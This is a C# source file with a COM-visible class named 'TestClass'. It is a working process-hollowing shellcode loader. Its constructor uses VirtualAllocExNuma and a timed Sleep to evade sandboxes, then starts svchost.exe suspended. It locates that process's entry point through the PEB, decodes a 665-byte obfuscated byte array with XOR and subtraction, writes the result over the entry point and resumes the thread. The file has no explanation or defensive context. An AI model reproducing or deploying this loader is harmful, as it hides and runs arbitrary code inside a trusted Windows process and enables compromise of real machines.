using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;


[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    struct STARTUPINFO
    {
        public Int32 cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1;
        public IntPtr PebAddress;
        public IntPtr Reserved2;
        public IntPtr Reserved3;
        public IntPtr UniquePid;
        public IntPtr MoreReserved;
    }
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint ResumeThread(IntPtr hThread);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, int dwSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);

    public TestClass()
    {
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (mem == null)
        {
            return;
        }
        DateTime t1 = DateTime.Now;
        Sleep(2000);
        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
        if (t2 < 1.5)
        {
            return;
        }
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
        PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
        uint tmp = 0;
        IntPtr hProcess = pi.hProcess;
        ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
        IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
        byte[] addrBuf = new byte[IntPtr.Size];
        IntPtr nRead = IntPtr.Zero;
        ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
        IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
        byte[] data = new byte[0x200];
        ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
        uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
        uint opthdr = e_lfanew_offset + 0x28;
        uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
        IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
        byte[] rrvZeP = new byte[665]{0x7a, 0x8e, 0xc3, 0x62, 0x76, 0x6e, 0x0a, 0x46, 0x46, 0x46, 0x85, 0x95, 0x85, 0x96, 0x94, 0x95, 0x8e, 0xb5, 0x14, 0x90, 0xe1, 0x8e, 0xcb, 0x94, 0xe6, 0x8e, 0xcb, 0x94, 0x5e, 0x8e, 0xcb, 0x94, 0xa6, 0x8e, 0x57, 0x3f, 0x8c, 0x8c, 0x89, 0xb5, 0x0d, 0x8e, 0xcb, 0xf4, 0x96, 0x8e, 0xb5, 0x06, 0x2a, 0xba, 0xe5, 0xfa, 0x44, 0xaa, 0xa6, 0x85, 0x05, 0x0d, 0x49, 0x85, 0x45, 0x05, 0x64, 0x69, 0x94, 0x8e, 0xcb, 0x94, 0xa6, 0xcb, 0x84, 0xba, 0x8e, 0x45, 0x16, 0x85, 0x95, 0xe0, 0xc5, 0xfe, 0x5e, 0x4b, 0x44, 0x57, 0xc1, 0xf4, 0x46, 0x46, 0x46, 0xcb, 0xc6, 0xce, 0x46, 0x46, 0x46, 0x8e, 0xc1, 0x06, 0xf2, 0xef, 0x8e, 0x45, 0x16, 0xcb, 0x8e, 0x5e, 0x82, 0xcb, 0x86, 0xa6, 0x96, 0x8d, 0x45, 0x16, 0x63, 0x90, 0x8e, 0x47, 0x0d, 0x85, 0xcb, 0xb2, 0xce, 0x89, 0xb5, 0x0d, 0x8e, 0x45, 0x10, 0x8e, 0xb5, 0x06, 0x2a, 0x85, 0x05, 0x0d, 0x49, 0x85, 0x45, 0x05, 0xbe, 0x66, 0xf1, 0x75, 0x8a, 0x43, 0x8a, 0xa2, 0x4e, 0x81, 0xbd, 0x15, 0xf1, 0x1e, 0x9e, 0x82, 0xcb, 0x86, 0xa2, 0x8d, 0x45, 0x16, 0xe0, 0x85, 0xcb, 0x4a, 0x8e, 0x82, 0xcb, 0x86, 0x5a, 0x8d, 0x45, 0x16, 0x85, 0xcb, 0x42, 0xce, 0x85, 0x9e, 0x8e, 0x45, 0x16, 0x85, 0x9e, 0x98, 0x9d, 0x9c, 0x85, 0x9e, 0x85, 0x9d, 0x85, 0x9c, 0x8e, 0xc3, 0x6a, 0xa6, 0x85, 0x94, 0x47, 0x66, 0x9e, 0x85, 0x9d, 0x9c, 0x8e, 0xcb, 0x54, 0x6d, 0x8b, 0x47, 0x47, 0x47, 0x99, 0x8e, 0xb5, 0x1b, 0x93, 0x8d, 0x38, 0xff, 0xed, 0xe8, 0xed, 0xe8, 0xe1, 0xf2, 0x46, 0x85, 0x90, 0x8e, 0xcd, 0x65, 0x8d, 0x0f, 0x04, 0x8a, 0xff, 0xa0, 0x4f, 0x47, 0x11, 0x93, 0x93, 0x8e, 0xcd, 0x65, 0x93, 0x9c, 0x89, 0xb5, 0x06, 0x89, 0xb5, 0x0d, 0x93, 0x93, 0x8d, 0x3c, 0xbc, 0x90, 0xfd, 0x2f, 0x46, 0x46, 0x46, 0x46, 0x47, 0x11, 0x6e, 0x49, 0x46, 0x46, 0x46, 0xb5, 0xb6, 0xa8, 0xb5, 0xb6, 0xa8, 0xb5, 0xb1, 0xa8, 0xb5, 0xb0, 0xb6, 0x46, 0x9c, 0x8e, 0xcd, 0x05, 0x8d, 0x0f, 0x06, 0x3b, 0x45, 0x46, 0x46, 0x89, 0xb5, 0x0d, 0x93, 0x93, 0xec, 0x43, 0x93, 0x8d, 0x3c, 0x9f, 0xcd, 0x27, 0x00, 0x46, 0x46, 0x46, 0x46, 0x47, 0x11, 0x6e, 0xf5, 0x46, 0x46, 0x46, 0xb7, 0x8a, 0xe0, 0xe4, 0xf2, 0xfc, 0x8b, 0x85, 0xff, 0x8d, 0xe9, 0xb1, 0x91, 0xe2, 0xb5, 0x90, 0xb5, 0x89, 0x97, 0xf7, 0xe7, 0xef, 0x85, 0x9f, 0x92, 0xb6, 0xb4, 0x85, 0x85, 0xfe, 0x92, 0xff, 0xbd, 0x8f, 0xf2, 0x88, 0x96, 0xe4, 0x9f, 0xfd, 0x83, 0xe3, 0xfc, 0xfe, 0xe3, 0x9e, 0xe2, 0xf0, 0xf6, 0xbf, 0xe5, 0xfd, 0xef, 0xea, 0xfc, 0xf3, 0xbe, 0x8e, 0x8e, 0xea, 0x91, 0x9e, 0xe8, 0x8f, 0x83, 0xf7, 0xfe, 0x9c, 0x9f, 0xe7, 0x83, 0x95, 0xe3, 0xfe, 0xe2, 0x9e, 0xb0, 0xb2, 0xec, 0xec, 0x82, 0xe2, 0x81, 0x8a, 0xbe, 0xf1, 0xee, 0xf7, 0x8b, 0x82, 0xfc, 0xe3, 0x81, 0xe8, 0xbf, 0x8c, 0xb4, 0xef, 0xbe, 0x91, 0xf6, 0xeb, 0x9c, 0x84, 0x97, 0x8c, 0x84, 0x9e, 0xe1, 0xee, 0x95, 0xe5, 0x46, 0x8e, 0xcd, 0x05, 0x93, 0x9c, 0x85, 0x9e, 0x89, 0xb5, 0x0d, 0x93, 0x8e, 0x3e, 0x46, 0xb4, 0x2e, 0xc2, 0x46, 0x46, 0x46, 0x46, 0x96, 0x93, 0x93, 0x8d, 0x0f, 0x04, 0x6b, 0x91, 0xa8, 0xbb, 0x47, 0x11, 0x8e, 0xcd, 0x00, 0xec, 0x4c, 0xe7, 0x8e, 0xcd, 0x75, 0xec, 0xa7, 0x9c, 0x94, 0xee, 0xc6, 0xb3, 0x46, 0x46, 0x8d, 0xcd, 0x66, 0xec, 0x42, 0x85, 0x9d, 0x8d, 0x3c, 0xf1, 0x80, 0xd8, 0xc0, 0x46, 0x46, 0x46, 0x46, 0x47, 0x11, 0x89, 0xb5, 0x06, 0x93, 0x9c, 0x8e, 0xcd, 0x75, 0x89, 0xb5, 0x0d, 0x89, 0xb5, 0x0d, 0x93, 0x93, 0x8d, 0x0f, 0x04, 0xa9, 0x40, 0x5e, 0xfb, 0x47, 0x11, 0xc1, 0x06, 0xf1, 0xa7, 0x8e, 0x0f, 0x05, 0xce, 0x53, 0x46, 0x46, 0x8d, 0x3c, 0x82, 0x76, 0xb1, 0x66, 0x46, 0x46, 0x46, 0x46, 0x47, 0x11, 0x8e, 0x47, 0x17, 0xf2, 0x44, 0x6b, 0x2c, 0x6e, 0x91, 0x46, 0x46, 0x46, 0x93, 0x9d, 0xec, 0x86, 0x9c, 0x8d, 0xcd, 0x15, 0x05, 0x64, 0x56, 0x8d, 0x0f, 0x06, 0x46, 0x56, 0x46, 0x46, 0x8d, 0x3c, 0x9e, 0x22, 0x93, 0x61, 0x46, 0x46, 0x46, 0x46, 0x47, 0x11, 0x8e, 0xd3, 0x93, 0x93, 0x8e, 0xcd, 0x6f, 0x8e, 0xcd, 0x75, 0x8e, 0xcd, 0x1c, 0x8d, 0x0f, 0x06, 0x46, 0xa6, 0x46, 0x46, 0x8d, 0xcd, 0x7d, 0x8d, 0x3c, 0x54, 0xd0, 0xcd, 0x64, 0x46, 0x46, 0x46, 0x46, 0x47, 0x11, 0x8e, 0xc3, 0x02, 0xa6, 0xc1, 0x06, 0xf2, 0x34, 0xe0, 0xcb, 0x4f, 0x8e, 0x45, 0x03, 0xc1, 0x06, 0xf1, 0x14, 0x9e, 0x03, 0x9e, 0xec, 0x46, 0x9d, 0x8d, 0x0f, 0x04, 0x76, 0x31, 0x24, 0x90, 0x47, 0x11};
        for (int i = 0; i < rrvZeP.Length; i++)
        {
            rrvZeP[i] = (byte)((((uint)rrvZeP[i] ^ 39) - 97) & 0xFF);
        }
        WriteProcessMemory(hProcess, addressOfEntryPoint, rrvZeP, rrvZeP.Length, out nRead);
        ResumeThread(pi.hThread);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}